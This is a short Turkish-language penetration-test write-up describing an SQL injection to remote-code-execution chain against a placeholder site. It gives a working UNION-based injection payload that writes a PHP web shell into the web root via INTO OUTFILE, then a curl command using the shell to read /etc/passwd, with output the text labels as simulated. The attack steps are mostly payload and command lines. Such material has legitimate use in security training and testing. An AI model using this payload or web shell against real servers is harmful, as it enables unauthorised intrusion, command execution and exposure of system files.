# Sızma Testi Projesi: SQL Injection to RCE Pipeline
---

## GİRİŞ VE HEDEF
Bu çalışmada, hedef web uygulamasındaki bir SQL Injection zafiyeti kullanılarak sunucu üzerinde bir arka kapı (Web Shell) oluşturulmuş ve bu sayede veritabanı zafiyeti, işletim sisteminde doğrudan komut çalıştırabilme (Remote Code Execution - RCE) noktasına evrilmiştir.

---

## ADIM 1: SQL Injection ve UNION Tabanlı Dosya Yazma Yetkisinin Tespiti
Hedef sitenin arama butonunda SQL Injection açığı tespit edilmiştir. Veritabanı kullanıcısının sunucuya dosya yazma yetkisi (FILE privilege) olduğu anlaşılmış ve UNION tabanlı sorgu ile sunucunun web dizinine zararlı bir PHP dosyası yüklenmiştir.

**Kullanılan SQL Enjeksiyonu ve Payload:**
```sql
[https://hedef-site.com/ara.php?id=-1](https://hedef-site.com/ara.php?id=-1)' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3 INTO OUTFILE '/var/www/html/kabuk.php'-- -

> **Açıklama:** Bu işlemle birlikte sunucunun `/var/www/html/` dizini altına dışarıdan gönderilen `cmd` parametresindeki işletim sistemi komutlarını çalıştıracak `kabuk.php` adında bir dosya yazdırılmıştır.

---

## ADIM 2: RCE (Uzaktan Komut Çalıştırma) Aşaması
Yüklenen zararlı dosya üzerinden Linux işletim sisteminin gizli ve kritik dosyalarından biri olan `/etc/passwd` okunarak sistemde komut çalıştırılabildiği ispat edilmiştir.

**Uygulanan İstismar Komutu (Simüle Edilen Terminal Çıktısı):**
```bash
mltme@kali:~$ curl "[https://hedef-site.com/kabuk.php?cmd=cat%20/etc/passwd](https://hedef-site.com/kabuk.php?cmd=cat%20/etc/passwd)"

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
dbadmin:x:1001:1001:Database Admin:/home/dbadmin:/bin/bash
